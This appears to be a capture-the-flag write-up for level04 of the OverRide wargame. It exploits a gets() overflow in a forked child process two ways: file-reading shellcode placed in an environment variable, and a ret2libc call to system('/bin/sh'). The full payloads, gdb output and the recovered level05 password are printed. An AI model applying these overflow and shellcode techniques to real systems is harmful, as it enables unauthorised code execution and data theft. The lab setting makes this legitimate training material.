# Level04

## Analysis

This one is a bit more complicated since it involves a fork with a child process.

Although most of the program is uninteresting, we have one way to break things and it is the `gets(s)` call in the child process, this would allow us to overflow on EIP in the cilds process.

First thing we can do is find the address of said EIP:

```bash
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1848]
Give me some shellcode, k
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1848]
0x6e6e6e6e in ?? ()
(gdb)
```

So we overflow after 156 bytes.

After that, we will also need to store our shellcode somewhere since no call to exec can be found inside of this program.

However there is one troublesome piece of code in this program, we cannot use our `/bin/sh` shellcode... 

`v8 = ptrace(PTRACE_PEEKUSER, v9, 44, 0);`

This checks if one of the instruction pointed at by %EIP (pointer to the next instruction) in the child process contains "x0b" which is present in every shellcodes using `execve()`, hence why we cannot use the previous shellcodes.

Instead we will use [this](https://shell-storm.org/shellcode/files/shellcode-73.html) shellcode which reads from a file and prints the content of said file, in our case, the file containing the password to level05.

It will be stored in an ENV variable as follows:

```bash
export SHELLCODE=$(python -c "print '\x90' * 1000 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'")
```

Now to find the address where this variable is stored :

```bash
```bash
(gdb) x/32s *((char **)environ)
0xffffd9b5:	"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdd9d:	"\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
0xffffde02:	"SHELL=/bin/bash"
```

Now that we have every component, we can craft our payload:

```bash
[156 filler] + [address]
```

<details>
  <summary>Spoiler</summary>

  ```bash
  level04@OverRide:~$ python -c "print '\x90' * 156 + '\xff\xff\xd9\xcd'[::-1]" | ./level04
  Give me some shellcode, k
  3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
  child is exiting...
  level04@OverRide:~$
  ```

</details>

## Ret2libc

We can also use the return to libc exploit, for that we will need the address of `/bin/sh` which is often stored in the memory because of potential functions that may call it:

```bash
(gdb) info proc map
process 1850
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fda000     0x2000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2b000, 0xf7fcd000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	"/bin/sh"
```

`0xf7f897ec` is the adreess of "/bin/sh", now we will also need the adress of `system` that we can get using gdb:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

After gathering our elements, we can craft our payload as follows:

```
[156 filler] + [system] + [4filler] + [binsh]
```

<details>
	<summary>Spoiler</summary>

```bash
level04@OverRide:~$ python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"' > /var/crash/tmp 
level04@OverRide:~$ cat /var/crash/tmp - | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

</details>
